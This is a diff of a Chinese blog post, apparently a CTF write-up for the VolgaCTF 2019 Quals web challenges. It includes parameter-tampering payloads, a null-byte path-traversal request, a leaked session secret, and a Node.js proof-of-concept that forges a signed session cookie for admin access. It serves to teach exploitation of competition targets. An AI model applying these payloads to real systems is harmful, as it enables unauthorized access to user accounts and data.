@@ -1,6 +1,103 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>VolgaCTF 2019 Quals · damn1t</title><meta name="description" content="VolgaCTF 2019 Qualsshoppayload:&amp;amp;balance=2000
-shop2payload:name=ausername&amp;amp;CartItems[0].id=4
-gallery先使用SourceLeakHacker这个脚本爆目录，发现无法得到正常返回结果，看了wr"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>VolgaCTF 2019 Quals</a></h3></div><div class="post-content"><h1 id="VolgaCTF-2019-Quals"><a href="#VolgaCTF-2019-Quals" class="headerlink" title="VolgaCTF 2019 Quals"></a>VolgaCTF 2019 Quals</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>payload:<code>&amp;balance=2000</code></p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>VolgaCTF 2019 Quals · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">VolgaCTF 2019 Quals</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-04-03</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="VolgaCTF-2019-Quals"><a href="#VolgaCTF-2019-Quals" class="headerlink" title="VolgaCTF 2019 Quals"></a>VolgaCTF 2019 Quals</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>payload:<code>&amp;balance=2000</code></p>
 <h2 id="shop2"><a href="#shop2" class="headerlink" title="shop2"></a>shop2</h2><p>payload:<code>name=ausername&amp;CartItems[0].id=4</code></p>
 <h2 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h2><p>先使用<strong>SourceLeakHacker</strong>这个脚本爆目录，发现无法得到正常返回结果，看了writeup，发现了<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>这个东西</p>
 <blockquote>
@@ -12,32 +109,32 @@ year = parseInt(location.pathname.slice(1)) || 2018;
 $.getJSON(`/api/images?year=${year}`, function(data) {
   $.each(data, function(key, img) {
 
-$(&apos;&lt;div&gt;&apos;, {
-class: &apos;col-lg-3 col-md-4 col-xs-6&apos;,
-html: $(&apos;&lt;a&gt;&apos;, {
+$(&#39;&lt;div&gt;&#39;, {
+class: &#39;col-lg-3 col-md-4 col-xs-6&#39;,
+html: $(&#39;&lt;a&gt;&#39;, {
   href: `/api/image?year=${year}&amp;img=${img}`,
-  class: &apos;d-block mb-4 h-100&apos;,
-  html: $(&apos;&lt;img&gt;&apos;, {
-class: &apos;img-fluid img-thumbnail&apos;,
+  class: &#39;d-block mb-4 h-100&#39;,
+  html: $(&#39;&lt;img&gt;&#39;, {
+class: &#39;img-fluid img-thumbnail&#39;,
 src: `/api/image?year=${year}&amp;img=${img}`,
-alt: &apos;&apos;
+alt: &#39;&#39;
   })
 })
- }).appendTo($(&apos;#gallery&apos;));;
+ }).appendTo($(&#39;#gallery&#39;));;
   });
-}).fail(function() { location = &apos;/login&apos;;});
+}).fail(function() { location = &#39;/login&#39;;});
   });
 </code></pre><p><strong>index.js</strong></p>
-<pre><code>const express= require(&apos;express&apos;);
-const session = require(&apos;express-session&apos;);
-const store = require(&apos;session-file-store&apos;)(session);
-const proxy = require(&apos;http-proxy-middleware&apos;);
-const parser = require(&apos;body-parser&apos;);
-const fs = require(&apos;fs&apos;);
+<pre><code>const express= require(&#39;express&#39;);
+const session = require(&#39;express-session&#39;);
+const store = require(&#39;session-file-store&#39;)(session);
+const proxy = require(&#39;http-proxy-middleware&#39;);
+const parser = require(&#39;body-parser&#39;);
+const fs = require(&#39;fs&#39;);
 const app = express();
 
-config = require(&apos;./config&apos;);
-auth = require(&apos;./auth&apos;)();
+config = require(&#39;./config&#39;);
+auth = require(&#39;./auth&#39;)();
 config.session.store = new store();
 
 app.use(parser.urlencoded({ extended: false }));
@@ -46,18 +143,18 @@ app.use(`${config.apiPrefix}/*`, auth.unless({path: config.whitelistPaths}));
 
 app.post(`${config.apiPrefix}/login`, function (req, res) {
     /* TODO: Implement login*/
-    res.redirect(&apos;/login&apos;);
+    res.redirect(&#39;/login&#39;);
 });
 
 app.get(`${config.apiPrefix}/logout`, function (req, res) {
     /* TODO: Implement logout */
-    res.redirect(&apos;/login&apos;);
+    res.redirect(&#39;/login&#39;);
 });
 
 app.get(`${config.apiPrefix}/flag`, function (req, res) {
     console.log(req.session);
-    if(req.session.name === &apos;admin&apos;)
-        res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
+    if(req.session.name === &#39;admin&#39;)
+        res.end(fs.readFileSync(&#39;../../flag&#39;, &#39;utf8&#39;));
     else
         res.status(403).send();
 });
@@ -66,29 +163,29 @@ app.use(proxy(config.proxy));
 app.listen(config.server.port);
 </code></pre><p><strong>config.js</strong></p>
 <pre><code>const config = {
-  apiPrefix: &apos;/api&apos;,
+  apiPrefix: &#39;/api&#39;,
   server: {
 port: 4000
   },
   proxy: {
-target: &apos;http://localhost:5000&apos;,
+target: &#39;http://localhost:5000&#39;,
 autoRewrite: true
   },
   session: {
-name: &apos;SESSION&apos;,
+name: &#39;SESSION&#39;,
 saveUninitialized: false,
-secret: &apos;;GmU1FSlVETF/vzEaBHP&apos;,
+secret: &#39;;GmU1FSlVETF/vzEaBHP&#39;,
 rolling: true,
 resave: false
   },
   whitelistPaths: [
-&apos;/api/login&apos;, &apos;/api/logout&apos;
+&#39;/api/login&#39;, &#39;/api/logout&#39;
   ]
 }
 
 module.exports = config;
 </code></pre><p><strong>auth.js</strong></p>
-<pre><code>const unless = require(&apos;express-unless&apos;);
+<pre><code>const unless = require(&#39;express-unless&#39;);
 
 const auth = function () {
   var authm = function (req, res, next) {
@@ -118,8 +215,8 @@ module.exports = auth;
 <p>config.js将session存储到本地服务器，似乎无法拿到，从index.js来看：</p>
 <pre><code>app.get(`${config.apiPrefix}/flag`, function (req, res) {
 console.log(req.session);
-if(req.session.name === &apos;admin&apos;)
-res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
+if(req.session.name === &#39;admin&#39;)
+res.end(fs.readFileSync(&#39;../../flag&#39;, &#39;utf8&#39;));
 else
 res.status(403).send();
 });
@@ -163,9 +260,9 @@ Upgrade-Insecure-Requests: 1
 <li>于是继续访问<code>GET //api/images?year=2018/../../../../../../../var/www/apps/volga_adminpanel/sessions%00 HTTP/1.1</code>，response为<code>[&quot;euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json&quot;]</code><br>关键的一点，如何构造session，我们有了secret，那么可以尝试自己在本地构造<br>先安装<code>npm install express-session</code></li>
 </ul>
 <p>poc：</p>
-<pre><code>var cookie = require(&apos;cookie-signature&apos;);
-var val = cookie.sign(unescape(&apos;../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM&apos;), &apos;;GmU1FSlVETF/vzEaBHP&apos;);
-console.log(&apos;Cookie: SESSION=s:&apos;+val);
+<pre><code>var cookie = require(&#39;cookie-signature&#39;);
+var val = cookie.sign(unescape(&#39;../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM&#39;), &#39;;GmU1FSlVETF/vzEaBHP&#39;);
+console.log(&#39;Cookie: SESSION=s:&#39;+val);
 </code></pre><p>得到session：<code>Cookie: SESSION=s:../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB/J4sPnVj5QkDEuBu/0QelFQQqAV6yh4</code></p>
 <p><strong>reference:</strong><br><a href="https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals" target="_blank" rel="noopener">https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals</a></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-04-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/04/03/CTF/VolgaCTF 2019(web)/,damn1t,VolgaCTF 2019 Quals,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/04/08/CTF/MidnightSun CTF 2019/" title="MidnightSun CTF 2019">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/04/01/CTF/fireshell ctf(vice)/" title="fireshell ctf2019 vice">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/04/03/CTF/VolgaCTF 2019(web)/">http://microvorld.com/2019/04/03/CTF/VolgaCTF 2019(web)/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/08/CTF/MidnightSun CTF 2019/" title="MidnightSun CTF 2019"><span>< PreviousPost</span><br><span class="prevTitle">MidnightSun CTF 2019</span></a><a class="nextSlogan" href="/2019/04/01/CTF/fireshell ctf(vice)/" title="fireshell ctf2019 vice"><span>NextPost ></span><br><span class="nextTitle">fireshell ctf2019 vice</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VolgaCTF-2019-Quals"><span class="toc-number">1.</span> <span class="toc-text">VolgaCTF 2019 Quals</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-number">1.1.</span> <span class="toc-text">shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shop2"><span class="toc-number">1.2.</span> <span class="toc-text">shop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gallery"><span class="toc-number">1.3.</span> <span class="toc-text">gallery</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
